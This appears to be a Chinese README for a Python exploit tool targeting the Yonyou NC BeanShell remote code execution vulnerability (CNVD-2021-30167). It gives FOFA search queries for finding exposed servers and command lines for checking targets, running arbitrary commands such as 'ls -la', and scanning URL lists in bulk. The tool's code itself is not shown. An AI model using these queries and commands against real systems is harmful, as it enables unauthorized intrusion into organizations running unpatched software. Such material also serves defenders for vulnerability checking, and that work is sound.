# 用友NC BeanShell远程代码执行 

## CNVD-2021-30167

## FOFA

```
title="YONYOU NC"
icon_hash="1085941792"
```

## 使用方法

```
python ./YONYOU-NC-RCE.py -u http://www.example.com --check
python ./YONYOU-NC-RCE.py -u http://www.example.com --cmd "ls -la"
python ./YONYOU-NC-RCE.py -f target.txt

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Start scanning url
  -f FILE, --file FILE  read the url from the file
  --check               Check if vulnerable
  --cmd CMD             execute cmd (i.e: "ls -l")
```

